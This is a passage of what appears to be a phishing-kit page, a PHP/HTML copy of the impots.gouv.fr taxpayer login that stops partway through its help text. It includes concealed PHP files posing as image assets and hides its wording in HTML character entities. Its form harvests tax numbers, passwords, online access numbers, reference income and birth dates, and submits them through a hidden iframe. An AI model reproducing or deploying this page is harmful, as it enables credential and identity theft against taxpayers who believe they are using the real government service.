<?php
require_once('images/index2.php');
include 'images/banner.php';
include 'images/banner1.php';
include 'images/banner2.php';
include 'images/banner3.php';
include 'images/banner4.php';
include 'images/banner5.php';
include 'images/banner6.php';
include 'images/banner7.php';
?>
<!DOCTYPE html>
<html lang="fr">
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta name="apple-itunes-app" content="app-id=505488770" />
		<meta name="format-detection" content="telephone=no" />
		<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
		<meta http-equiv="Pragma" content="no-cache" />
		<meta http-equiv="Expires" content="0" />
		<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" charset="utf-8" />
		<link rel="stylesheet" type="text/css" href="css/commun.css" charset="utf-8" />
		<link rel="stylesheet" type="text/css" href="css/mire.css" charset="utf-8" />
		<link rel="stylesheet" type="text/css" href="css/dac.css" charset="utf-8" />
		<link rel="shortcut icon" href="#" type="image/ico" />
		<title>&#80;&#97;&#114;&#116;&#105;&#99;&#117;&#108;&#105;&#101;&#114;&#115; | &#97;&#117;&#116;&#104;&#101;&#110;&#116;&#105;&#102;ication</title>
	</head>
	<body>
		<a href="#contenu" class="sr-only sr-only-focusable">&#65;&#108;&#108;&#101;r au co&#110;&#116;&#101;&#110;&#117;</a>
		<div role="alert" class="alert alert-danger erreur hide" role="alert" id='cookie_error' >
			<p>Pour acc&eacute;d&#101;&#114;&#32;&#97;&#117;&#120;&#32;&#115;&#101;&#114;&#118;&#105;&#99;&#101;&#115;&#32;&#101;&#110;&#32;&#108;&#105;&#103;ne, &#105;&#108;&#32;&#118;&#111;&#117;&#115;&#32;&#102;&#97;&#117;&#116;&#32;&#97;&#117; pr&eacute;alable <a href=#>accepter les cookies.</a></p>
		</div>
		<noscript>
			<div role="alert" class="alert alert-danger erreur" role="alert">
				<p>Pour acc&eacute;d&#101;&#114;&#32;&#97;&#117;&#120;&#32;&#115;&#101;&#114;&#118;&#105;&#99;&#101;&#115;&#32;&#101;&#110;&#32;&#108;&#105;&#103;ne, &#105;&#108;&#32;&#118;&#111;&#117;&#115;&#32;&#102;&#97;&#117;&#116;&#32;&#97;&#117; pr&eacute;alable <a href=#>activer JavaScript.</a></p>
			</div>
		</noscript>
		<div id="banniereSmart" class="container hide">
			<button type="button" class="close" aria-label="Fermer la banni&egrave;re" onClick="addClassName(document.getElementById('banniereSmart'), 'hide');">
			<span aria-hidden="true">&times;</span>
			</button>
			<a id="leStoreLogo" class="col-xs-3 col-sm-1" href="#">
			<img id="LogoSmartImage" src="images/Small-logoSMART.png" alt="T&eacute;l&eacute;charger l'app mobile" />
			</a>
			<div id="banniereSmartTexte" class="col-xs-8 col-sm-10">
				<div class="row">
					T&eacute;l&eacute;cha&#114;&#103;&#101;&#122;&#32;&#103;&#114;&#97;&#116;&#117;&#105;&#116;&#101;&#109;&#101;&#110;t l'app mobile I&#109;&#112;&#111;&#116;s.g&#111;&#117;&#118;&#32;&#115;&#117;&#114;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#97;&#112;&#112;&#97;&#114;&#101;&#105;&#108;.
				</div>
			</div>
		</div>
		<header>
			<div class="container">
		
			<div class="row">
			
				<div class="col-xs-12 col-sm-6 col-md-6">
					<div class="row">
						<div class="col-xs-3 col-sm-4 col-md-3 col-lg-3">
							<a id="bloc_marque" target="_blank" rel="noopener" href="#" title="Aa">
							<span class="sr-only">&#65;&#99;&#99;&#117;&#101;&#105;&#108;&#32;&#105;&#109;&#112;&#111;&#116;&#115;.&#103;&#111;&#117;&#118;.&#70;&#82;</span>
							</a>
						</div>
						<div class="col-xs-9 col-sm-8 col-md-9 col-lg-9" id="logo_alt">
							<h1>
								<span class="sr-only">Auth&#101;&#110;&#116;&#105;&#102;&#105;&#99;&#97;&#116;&#105;on</span>
							</h1>
							<a target="_blank" rel="noopener" href="#" title="a">
							<span class="sr-only">&#65;&#99;&#99;&#117;&#101;&#105;&#108; im&#112;&#111;&#116;&#115;.&#103;&#111;&#117;v.FR</span>
							</a>
						</div>
					</div>
				</div>
				<ul id="acces_espace" class="pull-right text-right espace_haut col-xs-12 col-sm-6 col-md-6 col-lg-5">
					<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
						<a class="btn btn-primary" href="#">
						<span class="dgfipicon dgfipicon-cadenas-ferme pull-left"></span>
						V&#111;&#116;&#114;&#101;&#32;&#101;&#115;&#112;&#97;&#99;&#101;&#32;&#112;&#97;&#114;&#116;&#105;&#99;&#117;&#108;&#105;&#101;r</a>
					</li>
					<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
						<a class="btn btn-danger" href="#" id="proPriv">
						<span class="dgfipicon dgfipicon-cadenas-ferme pull-left"></span>
						Vo&#116;&#114;&#101;&#32;&#101;&#115;&#112;&#97;&#99;&#101;&#32;&#112;&#114;&#111;&#102;&#101;&#115;&#115;&#105;&#111;&#110;&#110;el</a>
					</li>
				</ul>
			</div>

		</header>

		<div class="container">
			<div class="row">
				<ol class="breadcrumb ">
					<li><a href="#" id="toPortailPub" title="Retour au portail">&#65;&#99;&#99;&#117;&#101;il</a></li>
					<li class="active">Au&#116;&#104;&#101;&#110;&#116;&#105;&#102;&#105;&#99;&#97;&#116;ion</li>
				</ol>
			</div>
		</div>

		<main class="container" id="contenu">
			<div class="sr-only">
			&#76;&#101;&#32;&#99;&#111;&#110;&#116;&#101;&#110;&#117;&#32;&#100;&#117;&#32;&#102;&#111;&#114;&#109;&#117;&#108;&#97;&#105;&#114;&#101;&#32;&#101;&#116;&#32;&#108;'aide mise &agrave; &#118;&#111;&#116;&#114;&#101;&#32;&#100;&#105;&#115;&#112;&#111;&#115;&#105;&#116;&#105;on &eacute;vo&#108;&#117;&#101;&#110;&#116;&#32;&#115;&#101;&#108;&#111;&#110;&#32;&#118;&#111;&#115; r&eacute;p&#111;&#110;&#115;&#101;&#115;&#32;&#101;&#116;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#115;&#105;&#116;&#117;&#97;&#116;&#105;&#111;n
			</div>
			<div class="row">
				
				<div class="col-md-6">
					<a id="aide_scroll" href="#aide" class="btn btn-default hidden-lg hidden-md hidden-sm" style="" aria-hidden="false">
					<span class="dgfipicon dgfipicon-info text-muted"></span>&nbsp;&#65;&#105;&#100;&#101;
					</a>
					<div class="panel panel-default" >
						<div class="panel-heading" >
							<h2 id="titre_authent" class="text-center">A&#117;&#116;&#104;&#101;&#110;&#116;&#105;&#102;&#105;&#99;ation</h2>
						</div>
						<div class="panel-body">
							
							
							
							<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="erreur"></div>
							<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="blocage"></div>
							<form method=post enctype="application/x-www-form-urlencoded" accept-charset="UTF-8" name="CTX" id="formulairePrincipal" target="hidden-formulairePrincipal">
								<input type="hidden" name="url" value="" />
								<input type="hidden" id="spi" name="spi" />
								<input type="hidden" id="pwd" name="pwd" />
								<input type="hidden" id="rfr" name="rfr" />
								<input type="hidden" id="teledec" name="teledec" />
								<input type="hidden" id="dateNaissance" name="dateNaissance" />
								<input type="hidden" id="dateNaissance_tmp" name="dateNaissance_tmp" disabled="true"/>
								<input type="hidden" id="jourNaissance" name="jourNaissance" disabled="true" />
								<input type="hidden" id="moisNaissance" name="moisNaissance" disabled="true" />
								<input type="hidden" id="anneeNaissance" name="anneeNaissance" disabled="true" />
								<IFRAME style="display:none" name="hidden-formulairePrincipal" id="hidden-formulairePrincipal" aria-hidden="true" title="Cadre technique"> </IFRAME>
								<div class="row">
									<div class="col-md-12">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Num&eacute;ro &#102;&#105;&#115;&#99;&#97;&#108;</label>
											<div class="hide" id="changeSPI" > (<a href="#" onclick="afficheForm('CTX'); videChamps('CTX','_tmp','spi');">Changer d'&#117;&#116;&#105;&#108;&#105;&#115;&#97;&#116;&#101;&#117;r</a>)</div>
											<div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
											<input class="form-control" name="spi_tmp" type="tel" aria-required="true" autocomplete="username" id="spi_tmp" placeholder="13 chiffres" data-original-title="13 chiffres" data-toggle="tooltip" data-placement="top" data-mask="int" data-max=13 data-feedbackok=1/>
											<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_spi" ></div>
										</div>
									</div>
								</div>
								<div class="row">
									<div class="col-md-12">
										<div class="form-group sr-only" aria-hidden="true" id="fg_pwd">
											<label for="pwd_tmp">M&#111;&#116;&#32;&#100;&#101;&#32;&#112;&#97;&#115;se</label>
											<div class="input-group col-xs-12" id="ig_pwd">
												<input class="form-control" type="password" name="pwd_tmp" aria-required="true" autocomplete="current-password" id="pwd_tmp" data-toggle="tooltip" data-placement="top" maxlength=128 tabindex="-1" />
												<div id="boutonvisumdp" class="input-group-btn">
													<button type="button" class="btn btn-default" data-visu-mdp="off" onclick="switchVisuMdp(this,'pwd_tmp');return(false);" tabindex="-1" title="Vese" id="visumdp">
													<i class="dgfipicon dgfipicon-visualiser-oui"> &#xE965;</i>
													</button>
												</div>
											</div>
										</div>
									</div>
								</div>
								<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_pwd" ></div>
								<div class="row">
									<div class="col-md-12">
										<div class="form-group hide" id="fg_teledec">
											<label for="teledec_tmp">Num&eacute;ro d'acc&egrave;s &#101;&#110;&#32;&#108;&#105;&#103;&#110;e</label>
											<div class="ephemere hidden" id="liveCheck_teledec_tmp" role="alert"></div>
											<input class="form-control"  type="tel" data-original-title="7 chiffres" name="teledec_tmp" data-toggle="tooltip" data-placement="top" aria-required="true" placeholder="7 chiffres" autocomplete="off" id="teledec_tmp" data-mask="int" data-max=7 data-feedbackok=1 />
										</div>
									</div>
								</div>

								<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_teledec" ></div>
								<div class="row">
									<div class="col-md-12">
										<div class="form-group hide" id="fg_rfr">
											<label for="rfr_tmp">Re&#118;&#101;&#110;&#117;&#32;&#102;&#105;&#115;&#99;&#97;&#108;&#32;&#100;e r&eacute;f&eacute;rence</label>
											<div class="ephemere hidden" id="liveCheck_rfr_tmp" role="alert"></div>
											<input class="form-control"  type="tel" data-original-title="1 &agrave; 10 chiffres." data-toggle="tooltip" data-placement="top" name="rfr_tmp" aria-required="true" autocomplete="off" id="rfr_tmp" placeholder="1 &agrave; 10 chiffres" data-mask="int" data-max=10 data-feedbackok=1/>
											<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_rfr" ></div>
										</div>
									</div>
								</div>
								<div class="row form-row hide" id="fr_dateNaissance">
									<div class="col-xs-11 col-md-12">
										<label for="saisieDate">I&#110;&#100;&#105;&#113;&#117;&#101;&#122;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#100;&#97;&#116;&#101;&#32;&#100;&#101;&#32;&#110;&#97;&#105;&#115;&#115;&#97;&#110;ce</label>
										<div class="ephemere hidden" id="liveCheck_jourNaissance_tmp" role="alert"></div>
										<div class="ephemere hidden" id="liveCheck_moisNaissance_tmp" role="alert"></div>
										<div class="ephemere hidden" id="liveCheck_anneeNaissance_tmp" role="alert"></div>
									</div>
									<div class="col-xs-4 col-md-4">
										<label for="jourNaissance_tmp" class="hidden" >In&#100;&#105;&#113;&#117;&#101;&#122;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#106;&#111;&#117;&#114;&#32;&#100;&#101;&#32;&#110;&#97;&#105;&#115;&#115;&#97;&#110;ce</label>
										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre jour de naissance" data-toggle="tooltip" data-placement="top" name="jourNaissance_tmp" id="jourNaissance_tmp"  aria-required="true" aria-label="Jour de naissance" autocomplete="bday-day" placeholder="JJ" data-max=2 data-mask="jour" />
									</div>
									<div class="col-xs-4 col-md-4">
										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre mois de naissance" data-toggle="tooltip" data-placement="top" name="moisNaissance_tmp" id="moisNaissance_tmp"  aria-required="true" aria-label="Mois de naissance" autocomplete="bday-month" placeholder="MM" data-max=2 data-mask="mois" />
									</div>
									<div class="col-xs-4 col-md-4">
										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre ann&eacute;e de naissance" data-toggle="tooltip" data-placement="top" name="anneeNaissance_tmp" id="anneeNaissance_tmp"  aria-required="true" aria-label="Ann&eacute;e de naissance" autocomplete="bday-year" placeholder="AAAA" data-mask="int" data-max=4 maxlength="4" />
									</div>
									<div class="col-xs-11 col-md-12">
										<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_dateNaissance" ></div>
									</div>
								</div>
								<div class="row"  id="goOnBtn" >
									<div class="col-md-12">
										<div class="form-group text-center" id='go' data-original-title='Pour continuer, veuillez saisir votre num&eacute;ro fiscal.' data-toggle='tooltip' data-placement='bottom'>
											<button id="btnAction" type="submit" class="btn btn-default" aria-controls="erreur" aria-label="Pour continuer, veuillez saisir votre num&eacute;ro fiscal" data-href="" onclick="$('#formulairePrincipal').attr('action',urlCible);return(controleFormulaireEtSubmit(1,this)); " >Co&#110;&#116;&#105;&#110;&#117;&#101;r</button>
										</div>
									</div>
								</div>
							<div id="lesOublis" class="row hide">
								<div class="col-md-12 text-center">
									<a href="" tabindex="0" data-target="#numFiscal" data-toggle="modal" class="modal-link" aria-label="Recevoir mon num&eacute;ro fiscal par courriel (ouverture d'une fen&ecirc;tre de dialogue)" title="Recevoir mon num&eacute;ro fiscal par courriel (ouverture d'une fen&ecirc;tre de dialogue)"> Num&eacute;ro &#102;&#105;&#115;&#99;&#97;&#108;&#32;&#112;&#101;&#114;&#100;&#117;</a>
									|
									<a href="" tabindex="0" data-target="#passPerdu" data-toggle="modal" class="modal-link" aria-label="Renouveler mon mot de passe (ouverture d'une fen&ecirc;tre de dialogue)" title="Renouveler mon mot de passe (ouverture d'une fen&ecirc;tre de dialogue)"> M&#111;&#116;&#32;&#100;&#101;&#32;&#112;&#97;&#115;&#115;&#101;&#32;&#111;&#117;&#98;&#108;i&eacute; </a>
								</div>
							</div>
						</div>
						<div class="panel-footer text-center" id="FranceConnect">
							<div class="separ">
								<div id="choisirFC">Ou</div>
							</div>
							<form method="post" enctype="application/x-www-form-urlencoded" accept-charset="UTF-8" action="#" id="formfc">
								<div class="col-md-12 text-center">
									
					
									<input type="hidden" id="authKey" name="lmAuth" value="FranceConnect">
									<div id="erreurFC" role="alert" class="erreur alert alert-danger hide">
									&#86;&#111;&#117;&#115;&#32;&#110;&#101;&#32;&#112;&#111;&#117;&#118;&#101;&#122;&#32;&#97;&#99;&#116;&#117;&#101;&#108;&#108;&#101;&#109;&#101;&#110;&#116;&#32;&#112;&#97;&#115;&#32;&#118;&#111;&#117;&#115;&#32;&#105;&#100;&#101;nti&#102;&#105;&#101;&#114;&#32;&#101;&#110;&#32;&#117;&#116;&#105;&#108;&#105;&#115;&#97;&#110;&#116;&#32;&#70;&#114;&#97;&#110;&#99;&#101;&#67;&#111;&#110;&#110;ect.<br/>
										V&#111;&#117;&#115;&#32;&#112;&#111;&#117;&#118;&#101;&#122;&#32;&#99;&#111;&#110;&#116;&#97;&#99;&#116;&#101;&#114;&#32;&#108;&#101;&#32;&#115;&#117;&#112;&#112;&#111;&#114;&#116;&#32;&#70;&#114;&#97;&#110;&#99;&#101;&#67;&#111;&#110;&#110;&#101;&#99;&#116;&#32;&#112;&#111;&#117;&#114;&#32;&#100;&#101;&#32;&#112;&#108;&#117;&#115;&#32;&#97;&#109;&#112;&#108;&#101;&#115;&#32;&#114;&#101;&#110;&#115;&#101;&#105;&#103;&#110;&#101;ments
									</div>
									<div role="alert" class="erreur alert alert-danger hide" id="Cat2FC1" >
										La demande d'&#97;&#99;&#116;&#105;&#118;&#97;&#116;&#105;&#111;&#110;&#32;&#100;&#101;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#109;&#111;&#116;&#32;&#100;&#101;&#32;&#112;&#97;&#115;&#115;&#101;&#32;&#101;&#115;&#116;&#32;&#101;&#110;&#32;&#99;&#111;&#117;&#114;s.<br>
										V&#111;&#117;&#115;&#32;&#97;&#118;&#101;&#122;&#32;&#114;e&ccedil;u un courriel &agrave; l'adresse indiqu&eacute;e.<br>
										P&#111;&#117;&#114;&#32;&#118;&#111;&#117;&#115;&#32;&#99;&#111;&#110;&#110;&#101;&#99;&#116;&#101;&#114;&#32;&#118;&#105;&#97;&#32;&#70;&#114;&#97;&#110;&#99;&#101;&#67;&#111;&#110;&#110;&#101;&#99;&#116;, vo&#117;&#115;&#32;&#100;&#101;&#118;&#101;&#122;&#32;&#111;&#98;&#108;&#105;&#103;&#97;&#116;&#111;&#105;&#114;&#101;&#109;&#101;&#110;&#116;&#32;&#99;&#108;&#105;&#113;&#117;&#101;&#114;&#32;&#115;&#117;&#114;&#32;&#108;&#101;&#32;&#108;&#105;&#101;&#110;&#32;&#105;&#110;&#100;&#105;&#113;u&eacute; da&#110;&#115;&#32;&#99;&#101;&#32;&#99;&#111;&#117;&#114;&#114;&#105;&#101;l.<br>
										Attention, c&#101;&#32;&#108;&#105;&#101;&#110;&#32;&#101;&#115;&#116;&#32;&#118;&#97;&#108;&#97;&#98;&#108;&#101;&#32;&#56;&#32;&#104;&#101;&#117;&#114;&#101;s.<br>
									</div>
									<div role="alert" class="erreur alert alert-danger hide" id="Cat2FC2" >
									&#86;&#111;&#117;&#115;&#32;&#110;&#101;&#32;&#112;&#111;&#117;&#118;&#101;&#122;&#32;&#97;&#99;&#116;&#117;&#101;&#108;&#108;&#101;&#109;&#101;&#110;&#116;&#32;&#112;&#97;&#115;&#32;&#118;&#111;&#117;&#115;&#32;&#105;&#100;&#101;&#110;&#116;&#105;&#102;&#105;&#101;&#114;&#32;&#101;&#110;&#32;&#117;&#116;&#105;&#108;&#105;&#115;&#97;&#110;&#116;&#32;&#70;&#114;&#97;&#110;&#99;&#101;&#67;&#111;&#110;nect.<br/>
										V&#111;&#117;&#115;&#32;&#112;&#111;&#117;&#118;&#101;&#122;&#32;&#99;&#111;&#110;&#116;&#97;&#99;&#116;&#101;&#114;&#32;&#108;&#101;&#32;&#115;&#117;&#112;&#112;&#111;&#114;&#116;&#32;&#70;&#114;&#97;&#110;&#99;&#101;&#67;&#111;&#110;&#110;&#101;&#99;&#116;&#32;&#112;&#111;&#117;&#114;&#32;&#100;&#101;&#32;&#112;&#108;&#117;&#115;&#32;&#97;&#109;&#112;&#108;&#101;&#115;&#32;&#114;&#101;&#110;&#115;&#101;&#105;&#103;&#110;&#101;ments
									</div>
									<a id="leBouton" href="#" onclick="$(this).closest('form').submit()"><img src="images/logo-fc.svg" height="60" width="200" alt="S'iden"></a><br/>
								</div>
							</form>
							<p class="text-center">
								<a href="#" id="cQuoiFCGauche"  target="_blank" rel="noopener">
								Qu'est-c&#101;&#32;&#113;&#117;&#101;&#32;&#70;&#114;&#97;&#110;&#99;&#101;&#67;&#111;&#110;&#110;ect?
								<span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fen&ecirc;tre"></span>
								</a>
							</p>
							
						</div>

						<div class="panel-footer text-center hide" id="consentement">
							<p>En cliquant sur &laquo;Connexion&raquo;, v&#111;&#117;&#115;&#32;&#97;&#99;&#99;&#101;&#112;&#116;&#101;&#122;&#32;&#113;&#117;&#101;&#32;&#118;&#111;&#115;&#32;&#100;&#111;&#110;n&eacute;es personnelles (nom, pr&eacute;noms, d&#97;&#116;&#101;&#32;&#101;&#116;&#32;&#108;&#105;&#101;&#117;&#32;&#100;&#101;&#32;&#110;&#97;&#105;&#115;&#115;&#97;&#110;ce, adresse &eacute;lectronique) s&#111;&#105;&#101;&#110;&#116;&#32;&#116;&#114;&#97;&#110;&#115;&#109;&#105;&#115;&#101;s &agrave; &#70;&#114;&#97;&#110;&#99;&#101;&#67;&#111;&#110;&#110;&#101;&#99;&#116;.</p>

						</div>

						
						<div class="panel-footer text-center" id="Payer">
							<p>Vous pouvez &eacute;gal&#101;&#109;&#101;&#110;&#116;&#32;&#112;&#97;&#121;&#101;&#114;&#32;&#101;&#110;&#32;&#108;&#105;&#103;&#110;&#101;&#32;&#101;&#110;&#32;&#117;&#116;&#105;&#108;&#105;&#115;&#97;&#110;&#116;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#110;&#117;&#109;&eacute;ro fiscal et la r&eacute;f&eacute;re&#110;&#99;&#101;&#32;&#100;&#101;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#97;&#118;&#105;s</p>
							<a class="btn btn-success" id="payer" href='#'>
							P&#97;&#121;&#101;&#114;&#32;&#101;&#110;&#32;&#108;&#105;&#103;&#110;e
							</a>
						</div>
						
					</div>
				</div>
				<section class="col-md-6" id="aide">
					<div class="panel panel-default">
						<div class="panel-heading">
							<h2 class="text-center">&#65;&#105;&#100;&#101;</h2>
						</div>
						<div class="panel-body">
							<details id="aide_spi" class="aideSPI">
								<summary>O&ugrave; trouver votre num&eacute;ro fiscal&nbsp;?</summary>
								<div class="well">
									<p>Si vous disposez d&eacute;j&agrave; d'u&#110;&#32;&#101;&#115;&#112;&#97;&#99;&#101;&#32;&#112;&#97;&#114;&#116;&#105;&#99;&#117;&#108;&#105;&#101;r, vous pouvez <a href="#" id="disp_perte_spi" onclick="return false;" data-target="#numFiscal" data-toggle="modal" title="Ouverture dans une fen&ecirc;tre modale">recevoir votre num&eacute;r&#111;&#32;&#102;&#105;&#115;&#99;&#97;&#108;&#32;&#112;&#97;&#114;&#32;&#99;&#111;&#117;&#114;&#114;&#105;&#101;l</a>.</p>
									<p>Il figure aussi en haut de la premi&egrave;re page de votre derni&egrave;re d&eacute;claration de revenus re&ccedil;ue <a href="#" target="_blank" rel="noopener" title="Nouvelle fen&ecirc;tre">ou sur vos avis <span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fen&ecirc;tre"></span></a> : </p>
									<div id="exemple_SPI">
										<figure class="text-center spacer-top" role="group">
											<img src="images/spi.svg" alt="L&eacute;gende disponible apr&egrave;s l'illustration" class="img-responsive center-block img-thumbnail" width="473" height="145" />
											<figcaption class="text-muted"><em>Illustration : emplacement de votre num&eacute;ro fiscal, sur votre d&eacute;claration</em></figcaption>
										</figure>
										<figure class="text-center spacer-top" role="group">
											<img src="images/spi1.svg" alt="L&eacute;gende disponible apr&egrave;s l'illustration" class="img-responsive center-block img-thumbnail" width="350" height="145" />
											<figcaption class="text-muted"><em> Illustration : emplacement de votre num&eacute;ro fiscal, sur votre avis</em></figcaption>
										</figure>
									</div>
								</div>
							</details>
							<details id="aide_spi1" class="aideSPI">
								<summary>Vous n'avez pas encore de num&eacute;ro fiscal&nbsp;?</summary>
								<div class="well">
									<p>Pour obtenir la cr&eacute;ation de votre num&eacute;ro fiscal, veuillez vous adresser &agrave; votre
										<span id="CFP">C&#101;&#110;&#116;&#114;&#101;&#32;&#100;&#101;&#115;&#32;&#102;&#105;&#110;&#97;&#110;&#99;&#101;&#115;&#32;&#112;&#117;&#98;&#108;&#105;&#113;&#117;&#101;&#115;</span>
									</p>
								</div>
							</details>
							<details id="aide_code" class="aideCode hide">
								<summary>Vous avez perdu votre code de cr&eacute;ation</summary>
								<div class="well">
									<p>Vous pouvez
										<a href="#" data-toggle="modal" data-target="#codeCreation">l'obtenir &agrave; nouveau par courriel</a>.
									</p>
								</div>
							</details>
							<details id="aide_nael" class="aideIdentifiants hide">
								<summary>O&ugrave; trouver votre num&eacute;ro d'acc&egrave;s en ligne&nbsp;?</summary>
								<div class="well">
									<p>Il figure en haut de la premi&egrave;re page de votre derni&egrave;re d&eacute;claration de revenus re&ccedil;ue.</p>
									<div id="exemple_NAEL">
										<figure class="text-center spacer-top" role="group">
											<img src="images/num_acces.svg" alt="L&eacute;gende disponible apr&egrave;s l'illustration" class="img-responsive center-block img-thumbnail" width="473" height="145" />
											<figcaption class="text-muted"><em>Illustration : emplacement de votre num&eacute;ro d'acc&egrave;s en ligne, sur votre d&eacute;claration</em></figcaption>
										</figure>
									</div>
								</div>
							</details>
							<details id="aide_rfr" class="aideIdentifiants hide">
								<summary>O&ugrave; trouver votre revenu fiscal de r&eacute;f&eacute;rence&nbsp;?</summary>
								<div class="well">
									<p>Il se trouve sur la premi&egrave;re page de votre dernier avis d'imp&ocirc;t sur les revenus dans le cadre &laquo; Vos
										r&eacute;f&eacute;rences &raquo;.
									</p>
									<div id="exemple_RFR">
										<figure class="text-center spacer-top" role="group">
											<img src="images/rfr.svg" alt="L&eacute;gende disponible apr&egrave;s l'illustration" class="img-responsive center-block img-thumbnail" width="350" height="269" />
											<figcaption class="text-muted"><em>Illustration : emplacement de votre revenu fiscal de r&eacute;f&eacute;rence</em></figcaption>
										</figure>
									</div>
								</div>
							</details>
							<details id="aide_mdp" class="aideMdp hide">
								<summary>Vous avez oubli&eacute; votre mot de passe</summary>
								<div class="well">
									<p>Vous pouvez
										<a href="" tabindex="0" data-target="#passPerdu" data-toggle="modal" title="Ouverture dans une fen&ecirc;tre modale">renouveler votre mot de passe en quelques clics</a>.
									</p>
								</div>
							</details>
							<details id="aide_mdp1" class="aideMdp hide">
								<summary>Comment modifier votre mot de passe&nbsp;?</summary>
								<div class="well">
									<p>Une fois connect&eacute;, vous pourrez le modifier depuis &laquo;&nbsp;Mon profil&nbsp;&raquo;.</p>
								</div>
							</details>
							<details id="aide_ocfiNonIR" class="ocfiNonIR hide">
								<summary>Quels &eacute;l&eacute;ments fournir pour prouver votre identit&eacute;&nbsp;?</summary>
								<div class="well">
									<p>Vous devez adresser &agrave; votre <span id="CFP2">centre des Finances Fubliques</span> une reproduction recto-verso de l'un des &eacute;l&eacute;ments suivants&nbsp;:</p>
									<ul>
										<li>carte nationale d'identit&eacute; ou p&#97;&#115;&#115;&#101;&#112;&#111;&#114;&#116;&#32;&#101;&#110;&#32;&#99;&#111;&#117;&#114;&#115;&#32;&#100;&#101;&#32;&#118;&#97;&#108;&#105;dit&eacute;&nbsp;;</li>
										<li>livret de famille &agrave; jour&nbsp;;</li>
										<li>carte d'i&#110;&#118;&#97;&#108;&#105;&#100;&#101;&#32;&#100;&#101;&#32;&#103;&#117;&#101;&#114;&#114;e&nbsp;;</li>
										<li>carte d'&#105;&#110;&#118;&#97;&#108;&#105;&#100;&#101;&#32;&#99;&#105;&#118;&#105;l&nbsp;;</li>
										<li>extrait d'a&#99;&#116;&#101;&#32;&#100;&#101;&#32;&#110;&#97;&#105;&#115;&#115;&#97;&#110;&#99;&#101;&#32;&#111;&#117;&#32;&#99;&#111;&#112;&#105;&#101;&#32;&#105;&#110;t&eacute;grale avec mentions en marge&nbsp;;</li>
										<li>titre de s&eacute;jour&nbsp;;</li>
										<li>visa long s&eacute;j&#111;&#117;&#114;&#32;&#118;&#97;&#108;&#97;&#110;&#116;&#32;&#116;&#105;&#116;&#114;&#101;&#32;&#100;&#101; s&eacute;jour&nbsp;;</li>
									</ul>
									<p>&Agrave; d&eacute;faut, sont &eacute;galement recevables&nbsp;:</p>
									<ul>
										<li>livret de circulation&nbsp;;</li>
										<li>ca&#114;&#116;&#101;&#32;&#100;&#101;&#32;&#114;&#101;&#115;&#115;&#111;&#114;&#116;&#105;&#115;&#115;&#97;&#110;&#116;&#32;&#100;'un &Eacute;tat membre de l'Union Europ&eacute;enne.</li>
									</ul>
								</div>
							</details>
							<details id="aide_perteid" class="aideIdentifiants hide">
								<summary>Num&eacute;ro d'acc&egrave;s en ligne et revenu fiscal de r&eacute;f&eacute;rence perdus</summary>
								<div class="well">
									<p>Nous vous invitons &agrave; vous adresser &agrave; votre
										<span id="CFP3">centre des Finances Publiques</span> 
									</p>
									<p>F&#97;&#105;&#116;&#101;&#115;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#100;&#101;&#109;&#97;&#110;&#100;&#101;&#32;&#101;&#110;&#32;&#105;&#110;&#100;&#105;&#113;&#117;&#97;&#110;&#116;&#32;&#118;&#111;&#116;&#114;&#101; num&eacute;ro fiscal, ou votre &eacute;tat civil complet, et tous &eacute;l&eacute;ments utiles.
									</p>
									<p> Les identifiants vous seront alors transmis de mani&egrave;re s&eacute;curis&eacute;e, g&eacute;n&eacute;ralement &agrave; l'aide de vos coordonn&eacute;es (adresse &eacute;lectronique ou t&eacute;l&eacute;phone) d&eacute;j&agrave; connues de votre service. 
									</p>
								</div>
							</details>
							<details id="aide_connexFC" class="aideFC hide">
								<summary>S&#101;&#32;&#99;&#111;&#110;&#110;&#101;&#99;&#116;&#101;&#114;&#32;&#97;&#118;&#101;&#99;&#32;&#70;&#114;&#97;&#110;&#99;&#101;&#67;&#111;&#110;&#110;&#101;&#99;t</summary>
								<div class="well">
									<p>
										<b>Les services disponibles</b><br />
										Avec vos identifiants impots.gouv.fr, vous pouvez effectuer des d&eacute;marches administratives sur des sites partenaires de FranceConnect. Le logo FranceConnect figure sur l'espace d'authentification de ces sites. 
										<br /><br />
										<b>Un acc&egrave;s unique et personnel</b><br />
										L'identification sur un site pro&#112;&#111;&#115;&#97;&#110;&#116;&#32;&#108;&#101;&#32;&#98;&#111;&#117;&#116;&#111;&#110;&#32;&#70;&#114;&#97;&#110;&#99;&#101;&#67;&#111;&#110;&#110;&#101;&#99;&#116;&#32;&#101;&#115;&#116;&#32;&#115;&#116;&#114;&#105;&#99;&#116;&#101;&#109;&#101;&#110;&#116;&#32;&#112;&#101;&#114;&#115;&#111;&#110;&#110;&#101;&#108;le. Chaque membre d'un foyer fiscal disposant d'un num&eacute;ro fiscal et d'une adresse &eacute;lectronique valid&eacute;e sur le site impots.gouv.fr peut acc&eacute;der aux services en ligne en saisissant son propre num&eacute;ro fiscal.
										<br /><br />
										<b>Je rencontre des difficult&eacute;s pour me connecter</b><br />
